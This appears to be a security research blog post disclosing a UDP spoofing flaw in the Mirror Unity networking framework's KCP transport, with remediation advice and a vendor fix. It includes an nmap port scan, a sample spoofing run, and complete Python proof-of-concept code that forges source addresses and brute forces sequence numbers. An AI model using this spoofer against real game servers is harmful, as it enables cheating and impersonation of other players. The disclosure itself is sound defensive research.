---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-18_impersonating-other-players-with-udp-spoofing-in-mirror.md
original_filename: 2023-04-18_impersonating-other-players-with-udp-spoofing-in-mirror.md
title: Impersonating Other Players with UDP Spoofing in Mirror
category: documents
detected_topics:
- command-injection
- supply-chain
- sso
- idor
- ssrf
- otp
tags:
- imported
- documents
- command-injection
- supply-chain
- sso
- idor
- ssrf
- otp
language: en
raw_sha256: da7a8545488abe4d153a96d2215d9556123d8938b1b0b2d809dcd24bf445b2a5
text_sha256: 15cf09197b546626185faa0031b1e1fbb9ba7b8d2d14f5dc5dc380fad82ae2b2
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: true
---

# Impersonating Other Players with UDP Spoofing in Mirror

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-18_impersonating-other-players-with-udp-spoofing-in-mirror.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, sso, idor, ssrf, otp
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: True
- Raw SHA256: `da7a8545488abe4d153a96d2215d9556123d8938b1b0b2d809dcd24bf445b2a5`
- Text SHA256: `15cf09197b546626185faa0031b1e1fbb9ba7b8d2d14f5dc5dc380fad82ae2b2`


## Content

---
title: "Impersonating Other Players with UDP Spoofing in Mirror"
page_title: "Impersonating Other Players with UDP Spoofing in Mirror - Include Security Research Blog"
url: "https://blog.includesecurity.com/2023/04/impersonating-local-unity-players-with-udp-spoofing-in-mirror/"
final_url: "https://blog.includesecurity.com/2023/04/impersonating-local-unity-players-with-udp-spoofing-in-mirror/"
authors: ["IncludeSec (@IncludeSecurity)"]
programs: ["Unity (Mirror)"]
bugs: ["Game hacking", "UDP spoofing", "Reverse engineering"]
publication_date: "2023-04-18"
added_date: "2023-04-27"
source: "pentester.land/writeups.json"
original_index: 1254
---

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2023/04/diguise.png?fit=1280%2C1270&ssl=1)

# Impersonating Other Players with UDP Spoofing in Mirror

April 18, 2023 — IncludeSec

Mirror is an open-source multiplayer game framework for Unity. The history of Mirror is pretty interesting, I’d encourage anyone interested to [give it a read](https://mirror-networking.gitbook.io/docs/trivia/a-history-of-mirror) on their site. Long story short, it was built as a replacement for UNET (which was provided by Unity but had a number of issues and was ultimately deprecated).

Mirror has a number of different transports that you can swap between, such as UDP, websocket, TCP. I recently went on a deep dive into their default transport, KCP, which works over UDP.

Among other concepts, Mirror has commands, which are functions that clients can invoke on the server. Players have ownership of certain objects in the game, and users are only supposed to be able invoke commands on objects they own. For example, a game might implement a command `Player::ConsumePotion()` which deletes a potion and heals the user. Each player owns their own Player object and should only be able to call this method on their own Player (otherwise you could force other users to consume all of their potions at an inopportune time). Mirror also has RPCs, which are functions that the server calls on the clients.

Both of these would require some way of authenticating clients, so Mirror can know who sent a command/RPC and whether they were authorized to do it. I was curious how Mirror implements this authentication.

Digging in to its (quite nice) source code and analyzing recorded packets with 010 Editor, I found the KCP packet structure to look like this:

  * **header : byte**. This header determines whether KCP considers this packet reliable (0x01) or unreliable (0x02).
  * **conv_ : uint**. This one always seemed to be 0 in my captures, I didn’t dig into what it’s for.
  * **cmd : byte**. There’s a few different commands. The main one is CMD_PUSH (0x51) which “pushes” data. There are also handshake-related commands that are not important for this post.
  * **frg : byte**. I’m guessing this is used for fragmenting data among multiple packets. All the packets I sent are short so it was always 0 for me and I didn’t look into it further.
  * **wnd : ushort**. I think it has to do with max packet size. It was 4096 for me.
  * **ts : uint**. Time in milliseconds since application started running.
  * **sn : uint**. Might stand for “sequence number”? Mirror expects it to be the same as its `rcv_nxt` value (or within a certain window in case packets come out of order). Starts at 0 and increments by 1 each message.
  * **una : uint**. Not sure what this is, but it always seemed to be the same as “sn”.
  * **len : uint**. Size of the payload.
  * **kcpHeader : byte**. There’s a few possible values, for handshake, keepalive, disconnect. The main one is 0x03 used to indicate sending data.
  * **remoteTimestamp : double**. Timestamp, it could be set arbitrarily and didn’t seem to affect anything.
  * **messageTypeId: ushort**. Hashed message type ID (e.g. `Mirror.CommandMessage`). Mirror uses a special hashing routine for these IDs, will talk about that in a bit.
  * **payload : bytes**. The actual command or RPC data.

I was particularly interested in commands, and seeing if there was a way to trick the server into running commands for other users. In this case, the payload will be of type `Mirror.CommandMessage` which has this structure:

  * **netId : uint**. Each game object that can receive messages has a netId, they start at 0 and increment.
  * **componentIndex : byte**. A game object might have multiple components that can receive messages, this is the index of the targeted component.
  * **functionHash : ushort**. Hash of the (fully qualified) name of the function to invoke on the component, uses the same hashing function as I mentioned. It can’t be _any_ function, it has to be one of the special annotated commands or RPCs.
  * **dataLen : uint**. Length of all of the parameters to the function combined.
  * **data : bytes**. Contains the payload to the functions.

The hashing function for `messageTypeId` and `functionHash` looks like this in Python:
  
  
  def get_id(typename):
  return get_stable_hashcode(typename) & 0xffff
  
  def get_stable_hashcode(string):
  bytestr = str.encode(string);
  h = 23
  for c in bytestr:
  h = h * 31 + (int)(c)
  return h

Notably, I didn’t see in any of the packet fields any sort of authentication mechanism. A potential spoofer has to have the correct `sn` value. But since these start at 0 and increment by 1 with each message, it’s possible to brute force this. So how does Mirror determine where the packet comes from?

The `KcpServer::TickIncoming()` method is where incoming data is dealt with. It has the following code:
  
  
  public void TickIncoming()
  {
  while (socket != null && socket.Poll(0, SelectMode.SelectRead))
  {
  try
  {
  // receive
  int msgLength = ReceiveFrom(rawReceiveBuffer, out int connectionId);

The `connectionId` parameter is later used to look up which connection is sending data. How is it generated? `KcpServer::ReceiveFrom()` has this code:
  
  
  // EndPoint & Receive functions can be overwritten for where-allocation:
  // https://github.com/vis2k/where-allocation
  protected virtual int ReceiveFrom(byte[] buffer, out int connectionHash)
  {
  // NOTE: ReceiveFrom allocates.
  //  we pass our IPEndPoint to ReceiveFrom.
  //  receive from calls newClientEP.Create(socketAddr).
  //  IPEndPoint.Create always returns a new IPEndPoint.
  //  https://github.com/mono/mono/blob/f74eed4b09790a0929889ad7fc2cf96c9b6e3757/mcs/class/System/System.Net.Sockets/Socket.cs#L1761
  int read = socket.ReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref newClientEP);
  
  // calculate connectionHash from endpoint
  // NOTE: IPEndPoint.GetHashCode() allocates.
  //  it calls m_Address.GetHashCode().
  //  m_Address is an IPAddress.
  //  GetHashCode() allocates for IPv6:
  //  https://github.com/mono/mono/blob/bdd772531d379b4e78593587d15113c37edd4a64/mcs/class/referencesource/System/net/System/Net/IPAddress.cs#L699
  //
  // => using only newClientEP.Port wouldn't work, because
  //  different connections can have the same port.
  connectionHash = newClientEP.GetHashCode();
  return read;
  }

The [IPEndpoint class](https://learn.microsoft.com/en-us/dotnet/api/system.net.ipendpoint?view=net-6.0) consists of an IP and port. So it appears connections are authenticated based on a hash of these values. Since we’re using UDP packets, it seemed that it should be possible to spoof packets from arbitrary host/port combinations and Mirror will believe them to be authentic. So far we have three caveats to this:

  * The spoofer would need to brute force the correct ‘sn’ value
  * The spoofer would need to know the player’s IP address
  * The spoofer would need to know the port that the player is using to connect to the server

The last point might be the most tricky for an attacker to obtain. [RFC 6335](https://datatracker.ietf.org/doc/html/rfc6335) suggests that clients use a port in the following range for ephemeral ports: 49152-65535. This leaves a potential 16383 ports the client could be using. I found a nmap UDP port scan against the client when the game was running to be effective in determining the correct port, as shown below (the game client was using port 59462). UDP port scanning is quite slow, so I only scanned a subset of the ephemeral ports.
  
  
  $ sudo nmap -sU 192.168.0.14 -p59400-59500
  Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-04 13:15 EDT
  Nmap scan report for 192.168.0.14
  Host is up (0.0063s latency).
  Not shown: 99 closed ports
  PORT  STATE  SERVICE
  59462/udp open|filtered unknown
  MAC Address: [REDACTED] (Unknown)
  
  Nmap done: 1 IP address (1 host up) scanned in 132.04 seconds

This assumes though that the attacker has access to the local network the user is on. This might be the case in an eSport or LAN party type scenario. In the case of eSports in particular, this might actually present a high impact, altering the outcome of the game with money at stake. 

If an attacker did not know the correct UDP port (like when attacking a stranger over the internet), it might also be possible to brute force the port. However, the attacker would be brute forcing both the port and the `sn` value, which might not be feasible in a reasonable amount of time without any other data leaks that might give insight into the sn sequence value. Many ISPs also filter out spoofed packets, blocking the attack, but [some may not](https://spoofer.caida.org/country_stats.php).

In addition to IP and port, it’s also necessary to know the object ID (netId) and component ID of the component that will receive the message. This is game dependent, but can be constant (as in the game tested in the proof of concept below) or might depend on instantiation logic. This likely wouldn’t be too big of a barrier.

## Proof of concept

I came up with a Python proof of concept for this attack using the awesome Scapy library. The code for it is at the bottom of the post. To test it, I decided to use one of the example projects the Mirror library provides, which is a chat application. The command that will be invoked by the attacker is defined as:
  
  
  [Command(requiresAuthority = false)]
  void CmdSend(string message, NetworkConnectionToClient sender = null)
  {
  if (!connNames.ContainsKey(sender))
  connNames.Add(sender, sender.identity.GetComponent<Player>().playerName);
  
  if (!string.IsNullOrWhiteSpace(message))
  RpcReceive(connNames[sender], message.Trim());
  }

The attack will look like this:
  
  
  _________________  _____________________________
  Server  |  |Client
  192.168.0.14:7777|<---->|192.168.0.14:????? (determine port using port scan/Wireshark)
  _________________|  |_____________________________
  ^
  |
  | Spoofed UDP packets w/IP 192.168.0.14 and port = [client port]
  |
  ___|_____________
  Attacker  |
  192.168.0.253  |
  _________________|

I ran the game in the Unity editor as the server and a Windows build as the client:

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/11/poc1.png?resize=1024%2C519&ssl=1)

I determined the client source port using Wireshark to avoid waiting for a lengthy UDP scan (though the scan would’ve worked too). Then I ran my PoC from the attacking host using the following command (superuser privileges are needed for Scapy to be able to do raw packets). The most important line is the one with the `srchost` and `srcport` parameters, which are spoofed to pose as the client user’s host and port.
  
  
  $ ip a | grep 192
  inet 192.168.0.253/24 brd 192.168.0.255 scope global noprefixroute wlo1
  $ sudo python3 spoofer.py -v \
  --dsthost 192.168.0.14 --dstport 7777 \
  --srchost 192.168.0.14 --srcport 55342 \
  --messageType command \
  --function "System.Void Mirror.Examples.Chat.ChatUI::CmdSend(System.String,Mirror.NetworkConnectionToClient)"  \
  uiopasdf
  Sending packet: 010000000051000010570a000001000000010000002d00000003000000000000244094b40100000000973f1800000008007370***REDACTED-SUSPECT-TOKEN***  .
  Sent 1 packets.
  Sending packet: 010000000051000010570a000002000000020000002d00000003000000000000244094b40100000000973f1800000008007370***REDACTED-SUSPECT-TOKEN***  [Many such messages snipped for brevity ...]

This resulted in a large number of messages appearing on the players’ games, appearing to come from the client user:

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/11/poc2.png?resize=1024%2C488&ssl=1)

Chat provided a convenient example where it was easy to show impersonation using this technique without a video. You might notice that the CmdSend function has the flag `requiresAuthority=false` — this means any client can call the function, so this example doesn’t prove that you can call commands on objects belonging to other users. However, I tested other examples with `requiresAuthority=true` and they also work. I did not implement or test RPC spoofing in my PoC, however based on Mirror’s code I saw no reason that RPC spoofing wouldn’t also be possible. In this case the attacker would be pretending to be the server in order to invoke certain functions on the client.

## Impact

The most obvious potential impact to such an attack would be cheating and user impersonation. As mentioned, in certain scenarios like eSports, this might be high stakes, but in other cases it would be a mere annoyance. Impersonating a user and doing annoying or harassing things might have social (or even legal?) repercussions for that person.

Other attacks depend heavily on the game and the functionality contained in the commands and RPCs. Perhaps an RPC might be vulnerable to XXE or shell command injection (seems unlikely but who knows). Suppose there was a command for changing levels that forced clients to load asset bundles from arbitrary URLs. An attacker could [create a malicious asset bundle](https://blog.includesecurity.com/2021/06/hacking-unity-games-malicious-unity-game-objects/) and force the game clients to load it.

## Remediation

In order to prevent the attack, Mirror would have to have some way of verifying where the packets came from.

One solution to prevent spoofed commands might be for the server to send a randomly-generated token to each client on connection. In future communications, the client would need to include this token with every packet, and the server would drop packets with an invalid token. For RPCs, it would need to work the other way — the client would send the server a token, and the server would have to include that in future communications.

Assuming the attacker can’t intercept communications, this would prevent the spoofed packets, since the attacker would be unable to obtain this token.

An alternative but similar solution might be for the client and server to send keys during the initial handshake, and in subsequent packets use the keys to generate an HMAC of the packet. The opposite side verifies the HMAC before accepting the packet. This solution might be more bandwidth friendly, allowing longer keys sent only with the handshake, then shorter HMACs with subsequent messages. An attacker would have to intercept the initial message to get the key, unlike in the first remediation where they could obtain it in any message.

Before publication, this post was shared with the Mirror team. They have backported secure cookies to KCP: <https://github.com/vis2k/kcp2k/commit/ebb456a1132d971a9227c3d0e4449931f455c98c>. Additionally, an encrypted transport implementation is currently under development. 

## Proof of concept code

**spoofer.py**
  
  
  import argparse
  import sys
  import kcp_packet
  import command_message
  import utils
  
  try:
  from scapy.all import *
  except ImportError:
  print("Scapy module required -- pip install scapy")
  exit(1)
  
  parser = argparse.ArgumentParser(description='Craft spoofed Mirror Commands and RPCs over KCP')
  parser.add_argument('--dsthost', type=str, help="Destination IP address", required=True)
  parser.add_argument('--dstport', type=int, help="Destination port", default=7777)
  parser.add_argument('--srchost', type=str, help="Spoofed source IP", required=True)
  parser.add_argument('--srcport', type=int, help="Spoofed source port", required=True)
  parser.add_argument('--messageType', type=str, choices=["command", "rpc"], help="Message type to send", required=True)
  parser.add_argument('--function', type=str, help="The function to invoke on the receiver. Must be a fully qualified function signature like this -- do not deviate, add any spaces, etc: 'System.Void Mirror.Examples.Chat.ChatUI::CmdSend(System.String,Mirror.NetworkConnectionToClient)'")
  parser.add_argument('--functionId', type=int, help="alternative for specifying function to call, use the hashed ID value sent by Mirror instead of generating it. You can grab the ID by examining Mirror traffic. Must also specify parameter types though using --function with a dummy name but the correct parameter types.", default=None)
  parser.add_argument('--snStart', type=int, help="start value for brute forcing the recipient's SN value", default=1)
  parser.add_argument('--snEnd', type=int, help="end value for brute forcing the recipient's SN value", default=100)
  parser.add_argument('--netId', type=int, help="netId of gameobject that will receive the message", default=1)
  parser.add_argument('--componentId', type=int, help="componentId of component that will receive the message", default=0)
  parser.add_argument('--verbose', '-v', action='store_true', )
  parser.add_argument('arguments', metavar='A', type=str, nargs='+', help='Arguments to the invoked function')
  
  args = parser.parse_args(sys.argv[1:])
  
  def verbose_print(text):
  if (args.verbose):
  print(text);
  
  # Construct data payload per message type
  data = None
  if (args.messageType == "command"):
  data = command_message.create_from_function_def(1, 0, args.function, args.arguments)
  elif (args.messageType == "rpc"):
  pass # TODO
  
  # Send a series of KCP packets with this payload to brute force the SN value
  for sn in range(args.snStart, args.snEnd):
  msg = kcp_packet.create(sn=sn, data=data)
  
  verbose_print("Sending packet: " + msg.hex())
  
  packet = IP(src=args.srchost, dst=args.dsthost) / UDP(sport=args.srcport, dport=args.dstport) / msg
  send(packet)

**kcp_packet.py**
  
  
  import struct
  
  struct_fmt = "=" # native byte order, standard sizes
  struct_fmt = struct_fmt + 'c' # header : byte
  struct_fmt = struct_fmt + 'I' # conv_ : uint
  struct_fmt = struct_fmt + 'c' # cmd : byte
  struct_fmt = struct_fmt + 'c' # frg : byte
  struct_fmt = struct_fmt + 'H' # wnd : ushort
  struct_fmt = struct_fmt + 'I' # ts : uint
  struct_fmt = struct_fmt + 'I' # sn : uint
  struct_fmt = struct_fmt + 'I' # una : uint
  struct_fmt = struct_fmt + 'I' # len : uint
  
  packet_size = struct.calcsize(struct_fmt)
  
  HDR_RELIABLE = b'\x01'
  CMD_PUSH = b'\x51'
  WINDOW = 4096
  
  def create(header=HDR_RELIABLE, conv_=0, cmd=CMD_PUSH, frg=b'\x00', wnd=WINDOW, ts=2647, sn=1, una=None, data=b''):
  
  # idk what una is, but it seems to always be the same as sn in my samples
  # so default to that, unless they've overridden it
  if (una == None):
  una = sn 
  
  return struct.pack(struct_fmt, header, conv_, cmd, frg, wnd, ts, sn, una, len(data)-1) + data
  
  def parse(packet):
  tup = struct.unpack(struct_fmt, packet[0:packet_size])
  return {
  'header': tup[0],
  'conv_': tup[1],
  'cmd': tup[2],
  'frg': tup[3],
  'wnd': tup[4],
  'ts': tup[5],
  'sn': tup[6],
  'una': tup[7],
  'data': packet[packet_size:]
  }

**command_message.py**
  
  
  import utils
  import struct
  
  struct_fmt = "=" # native byte order, standard sizes
  
  # really, these 3 fields should be part of kcp_packet. but when I put them there it doesn't work and I'm not sure why
  struct_fmt = struct_fmt + 'c' # kcpHeader : byte (0x03 = data)
  struct_fmt = struct_fmt + 'd' # remoteTimestamp : double
  struct_fmt = struct_fmt + "H" # messageTypeId: ushort -- hashed message type id (in this case Mirror.CommandMessage)
  
  struct_fmt = struct_fmt + "I" # netId : uint
  struct_fmt = struct_fmt + "c" # componentIndex : byte
  struct_fmt = struct_fmt + "H" # functionHash : ushort
  struct_fmt = struct_fmt + "I" # dataLen : uint
  
  message_type_id = utils.get_id("Mirror.CommandMessage")
  
  # function signature needs to be of the form:
  #  System.Void Mirror.Examples.Chat.ChatUI::CmdSend(System.String,Mirror.NetworkConnectionToClient)
  # for whatever command function you want to invoke. This is what Mirror expects.
  # We also parse the signature to determine the different fields that need to be sent
  def create_from_function_def(net_id, component_id, function_signature, params):
  
  function_id = utils.get_id(function_signature);
  param_types = utils.parse_param_types_from_function_def(function_signature)
  
  return create_from_function_id(net_id, component_id, function_id, param_types, params);
  
  # Param types must contain full typename. E.g. System.String, System.Int32
  def create_from_function_id(net_id, component_id, function_id, param_types, params):
  
  data = b''
  for i in range(0, len(params)):
  data = data + utils.pack_param(param_types[i], params[i])
  data = data + b'\x0a'
  return struct.pack(struct_fmt, b'\x03', 10.0, message_type_id, net_id, bytes([component_id]), function_id, len(data)) + data
  
  def parse():
  pass

**utils.py**
  
  
  import struct
  
  # Take fully qualified function signature and grab parameter types of each argument, excluding
  # the last one which is always a Mirror.NetworkConnectionToClient in Mirror
  def parse_param_types_from_function_def(signature):
  # grab only the stuff between the parenthesis
  param_str = signature[signature.find('(')+1 : -1]
  # split by ',' and remove the last one which is always added by recipient, not send by the client
  return param_str.split(',')[:-1]
  
  # turn a function parameter into bytes expected by Mirror
  # e.g. string -> ushort length, char[]
  def pack_param(param_type, param):
  # strings are packed as ushort len, char[]
  if (param_type == "System.String"):
  fmt = f"H{len(param)}s"
  return struct.pack(fmt, len(param)+1, str.encode(param))
  # integers
  elif (param_type == "System.Int32"):
  fmt = f"i"
  return struct.pack(fmt, int(param))
  else:
  print(f"Error: do not yet know how to pack parameter of type {param_type} -- add logic to pack_param()")
  
  #
  # These methods are used to generate different IDs within Mirror used to associate
  # packets with functions and types on the receiving side
  #
  
  def get_id(typename):
  return get_stable_hashcode(typename) & 0xffff
  
  def get_stable_hashcode(string):
  bytestr = str.encode(string);
  h = 23
  for c in bytestr:
  h = h * 31 + (int)(c)
  return h

### Share this:

  * [ Share on X (Opens in new window) X ](https://blog.includesecurity.com/2023/04/impersonating-local-unity-players-with-udp-spoofing-in-mirror/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://blog.includesecurity.com/2023/04/impersonating-local-unity-players-with-udp-spoofing-in-mirror/?share=facebook)
  * 

### Like this:

Like Loading…

Categories [appsec](https://blog.includesecurity.com/category/appsec/), [gamedev](https://blog.includesecurity.com/category/gamedev/), [games](https://blog.includesecurity.com/category/games/), [Reverse Engineering](https://blog.includesecurity.com/category/reverse-engineering/), [unity](https://blog.includesecurity.com/category/unity/) Tags [games](https://blog.includesecurity.com/tag/games/), [security research](https://blog.includesecurity.com/tag/security-research/), [unity](https://blog.includesecurity.com/tag/unity/), [vulnerabilities](https://blog.includesecurity.com/tag/vulnerabilities/) Post navigation

[Mitigating SSRF in 2023](https://blog.includesecurity.com/2023/03/mitigating-ssrf-in-2023/)

[Think that having your lawyer engage your penetration testing consultancy will help you? Think again.](https://blog.includesecurity.com/2023/10/attorney-client-privilege-penetration-testing-results-reports/)
